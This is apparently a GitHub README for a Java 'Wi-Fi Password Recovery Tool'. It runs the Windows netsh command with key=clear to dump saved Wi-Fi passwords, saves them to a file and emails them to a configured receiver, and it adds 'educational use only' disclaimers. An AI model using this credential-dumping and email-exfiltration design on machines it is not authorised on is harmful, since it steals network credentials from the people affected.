# Wi-Fi Password Recovery Tool (Java)

This Java project retrieves saved Wi-Fi profiles and their corresponding passwords from a Windows machine. The recovered passwords are:

- ✅ Printed to the console
- ✅ Saved to a local text file
- ✅ Sent to a specified email address

> ⚠️ **For educational purposes only. Do not use this tool on devices you do not own or have explicit permission to access.**

---

## 💡 Features

- Lists all saved Wi-Fi profiles using `netsh wlan show profiles`
- Retrieves stored passwords using `netsh wlan show profile "<name>" key=clear`
- Outputs the profile and password pairs to:
    - Console
    - File (`wifi-passwords.txt`)
    - Email

---

## 🛠️ Requirements

- Java 8 or higher
- Maven (for dependency management and build)
- Internet connection (for sending emails)
- Windows OS (uses Windows-specific `netsh` commands)

---

## 🛠️ Setup and Usage

1. **Clone the project**

[//]: # (   git clone https://github.com/jimboyz-js/wifi-password-recovery-java.git)

[//]: # (   cd wifi-password-recovery-java)
```bash
git clone https://github.com/jimboyz-js/JavaWifiPasswordRetriever.git
cd JavaWifiPasswordRetriever
```

## ⚙️ Maven Setup

1. Add the following dependency with compatible version to your `pom.xml` for email functionality:

```xml
<dependencies>
    <dependency>
        <groupId>com.sun.mail</groupId>
        <artifactId>jakarta.mail</artifactId>
        <version>2.0.1</version>
    </dependency>
</dependencies>
```

## 📦 How to Build with Maven and Create a JAR

1. Compile and package the project:
   - This will generate a JAR file inside the target/ directory.
    ```bash
    mvn clean package
    ```

2. Run the JAR file:
```bash
java -jar target/JavaWifiPasswordRetriever-1.0.jar
```

[//]: # (java -jar target/wifi-password-recovery-1.0.jar)

## 📄 Sample Output

```bash
Profile: HomeWiFi, Password: home1234
Profile: OfficeNet, Password: office456
```

## 📁 Output File

A file named `wifi-passwords.txt` will be created (or updated) with all recovered credentials.

## 📧 Email Report
The project sends the complete result to a specified email address using Jakarta Mail SMTP.

Create a `.email-config` file in a project root directory and set your email, password, and recipient email.

- App password (for email, not your regular password)

```ini
app.email.username=your_email@gmail.com
app.email.password=your-password
app.email.receiver=receiver-password@mail.com
```

Update sendToMail() method if you want to change SMTP configuration with:

- SMTP host (e.g., smtp.gmail.com)
- Port (587) for TLS
- Auth and etc.

## ⚠️ Disclaimer

This tool is for **_educational use only_**. Do not use it on devices or networks you do not own or have explicit permission to access. Misuse may be illegal or unethical.

**🔒 Important Note:**
This type of code (Wi-Fi password extraction and emailing) can be flagged as malicious behavior, so use it responsibly and only on your own devices for testing or legitimate recovery purposes.

**⚠️ Educational Use Only:**
This project is for learning and personal use. Do not use it on devices you do not own or without permission.

## 📃 License
This project is licensed under the MIT License.